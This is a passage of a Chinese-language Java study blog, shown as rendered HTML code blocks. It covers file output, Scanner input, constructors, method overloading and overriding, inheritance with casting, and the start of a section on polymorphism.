class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OutputStreamStudy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        String fileName = <span class="string">&quot;c:\\CodeProject\\JavaStudy\\src\\Flag&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>(OutputStream outputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;c:\\CodeProject\\JavaStudy\\src\\Flag&quot;</span>))&#123;</span><br><span class="line">            outputStream.write(<span class="string">&quot;Hello Pan3a&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h1><ul><li>推荐<code>hasNextLine</code>方法，直接获取全部数据，<code>hasNext</code>无法获取空格，认为其是结束符。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScannerStudy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">        System.out.print(<span class="string">&quot;next方法接收:&quot;</span>);</span><br><span class="line"><span class="comment">//      判断是否还有输入</span></span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNext())&#123;</span><br><span class="line">            String stringOne = scanner.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;输入的数据为:&quot;</span> + stringOne);</span><br><span class="line">        &#125;</span><br><span class="line">        scanner.close();</span><br><span class="line"></span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.print(<span class="string">&quot;nextLine方式接收:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(scan.hasNextLine())&#123;</span><br><span class="line">            String stringTwo = scan.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;输入的数据为:&quot;</span> + stringTwo);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;请输入数字:&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (scan.hasNextDouble())&#123;</span><br><span class="line">            <span class="keyword">double</span> number = scan.nextDouble();</span><br><span class="line">            count += <span class="number">1</span>;</span><br><span class="line">            sum += number;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;一共&quot;</span> + Integer.toString(count) + <span class="string">&quot;个数&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;和为&quot;</span> + sum);</span><br><span class="line">        scan.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p>- </p><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul><li>主要是结合访问控制符和参数传递来实现特定功能。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    String[] name = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String... names)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(String name:names)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;构造方法可变参数: &quot;</span> + name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.name = names;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String name:<span class="keyword">this</span>.name) &#123;</span><br><span class="line">            System.out.print(name + <span class="string">&quot;   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String[] names)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String setName:names)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;数组类型参数: &quot;</span> + setName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.name = names;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectFunc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] names = &#123;<span class="string">&quot;Pan3a&quot;</span>,<span class="string">&quot;Forever404&quot;</span>&#125;;</span><br><span class="line"><span class="comment">//      构造方法实例化</span></span><br><span class="line">        Person personOne = <span class="keyword">new</span> Person(names);</span><br><span class="line"><span class="comment">//      数组参数</span></span><br><span class="line">        personOne.setName(names);</span><br><span class="line"></span><br><span class="line"><span class="comment">//      参数传递 指向的是原变量地址   改变变量实质变量名不变地址为新地址---新对象</span></span><br><span class="line">        String name = <span class="string">&quot;Pan3a&quot;</span>;</span><br><span class="line">        Person personTwo = <span class="keyword">new</span> Person(name);</span><br><span class="line">        personTwo.getName();</span><br><span class="line">        name = <span class="string">&quot;Forever404&quot;</span>;</span><br><span class="line">        personTwo.getName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//      参数传递 数组地址没改变 改变的是地址中存的值</span></span><br><span class="line">        String[] color = &#123;<span class="string">&quot;RED&quot;</span>,<span class="string">&quot;BLUE&quot;</span>&#125;;</span><br><span class="line">        Person personThree = <span class="keyword">new</span> Person(color);</span><br><span class="line">        personThree.getName();</span><br><span class="line">        color[<span class="number">0</span>] = <span class="string">&quot;GREEN&quot;</span>;</span><br><span class="line">        System.out.println();</span><br><span class="line">        personThree.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><ul><li>每个类都有构造方法，没有则Java编译器将会提供一个默认的构造方法。构造方法需与类同名，一个类可以有多个构造方法。</li><li>构造方法类似于<code>Python</code>的<code>__init__(self)</code>主要作用于类的初始化。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.test;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectConstruct</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person personOne = <span class="keyword">new</span> Person();</span><br><span class="line">        System.out.println(personOne.getName());</span><br><span class="line">        System.out.println(personOne.getAge());</span><br><span class="line"></span><br><span class="line">        Person personTwo = <span class="keyword">new</span> Person(<span class="string">&quot;Pan3a&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(personTwo.getName());</span><br><span class="line">        System.out.println(personTwo.getAge());</span><br><span class="line"></span><br><span class="line">        Person personThree = <span class="keyword">new</span> Person(<span class="string">&quot;Forever404&quot;</span>);</span><br><span class="line">        System.out.println(personThree.getName());</span><br><span class="line">        System.out.println(personThree.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  无参数构造方法，会自动创建，默认的构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  重载此构造方法，实例化类时根据传递参数自动选择构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  构造方法调用其他构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(name,<span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><ul><li>方法名相同，参数不同，返回值相同。</li><li>overload，重载，相当于重新写了一个方法，但是这些方法都不同，因为它们的参数都不一样。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.hello;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectOverload</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person personOne = <span class="keyword">new</span> Person();</span><br><span class="line">        personOne.hello();</span><br><span class="line">        personOne.hello(<span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">        personOne.hello(<span class="string">&quot;Pan3a&quot;</span>,<span class="number">16</span>);</span><br><span class="line">        personOne.hello(<span class="string">&quot;Pan3a&quot;</span>,<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (age &gt; <span class="number">18</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello &quot;</span> + name + <span class="string">&quot;, you are an adult!&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Hello &quot;</span> + name + <span class="string">&quot;, you are a child!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><ul><li>子类无法继承父类的构造方法</li><li>子类的构造方法必须与父类的构造方法类型一致   如：无参对应无参</li><li>子类的构造方法第一条语句必须是父类构造方法</li><li>只能单继承，除Object外没有关键字<code>extends</code>的类都是继承于<code>Object</code></li><li>Java15特性，<code>sealed</code>于<code>permits</code>修饰的类只能在指定的类继承</li><li>Java继承还有向上转型和向下转型两种。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sealed <span class="class"><span class="keyword">class</span> <span class="title">Color</span> <span class="title">permits</span> <span class="title">Red</span>,<span class="title">Blue</span>,<span class="title">Green</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.extend.up;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectExtendsUp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//      向上转型 因为继承关系 Student-&gt;Person-&gt;Object  Student有Person的全部属性</span></span><br><span class="line">        Person personOne = <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(personOne.name);</span><br><span class="line">        System.out.println(personOne.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;Pan3a&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age = <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.extend.up;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectExtendsUp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//        向下转型 也是由于继承关系 但父类无法转为子类 因为子类有父类没有的属性</span></span><br><span class="line">        Person p1 = <span class="keyword">new</span> Student();</span><br><span class="line">        Person p2 = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="comment">//        Student s2 = (Student) p2;  这里会由于实例化的Person，但变量类型是Student，变量类型中有Person中没有的属性因此会失败</span></span><br><span class="line">        <span class="keyword">if</span>(p1 <span class="keyword">instanceof</span> Student)&#123;</span><br><span class="line">            Student s1 = (Student) p1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;Pan3a&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age = <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.extend;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectExtends</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        Student studentPan3a = new Student(&quot;Pan3a&quot;,18,60);</span></span><br><span class="line">        Student studentPan3a = <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(studentPan3a.getAge());</span><br><span class="line">        System.out.println(studentPan3a.getName());</span><br><span class="line">        System.out.println(studentPan3a.getScore());</span><br><span class="line">        studentPan3a.setScore(<span class="number">99</span>);</span><br><span class="line">        System.out.println(studentPan3a.getScore());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name,<span class="keyword">int</span> age,<span class="keyword">int</span> score)</span></span>&#123;</span><br><span class="line"><span class="comment">//      子类构造方法必须先调用父类构造方法</span></span><br><span class="line">        <span class="keyword">super</span>(name,age);</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  这里子类的构造方法必须与父类对应  如：无参对应无参</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">int</span> score)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line"><span class="comment">//        System.out.println(&quot;Score has change:&quot; + Integer.toString(score));</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这里就无法继承Animal类，因为此类用了final关键字进行修饰</span></span><br><span class="line"><span class="comment">class Teacher extends Animal&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure><h2 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h2><ul><li>Overrie，都是同一个方法，类型参数都一样，只不过实现功能有所更改。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.override;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectOverride</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student studentOne = <span class="keyword">new</span> Student();</span><br><span class="line">        studentOne.hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.hello();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><ul><li>根据不同类自动执行不同的方法，动态调用。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 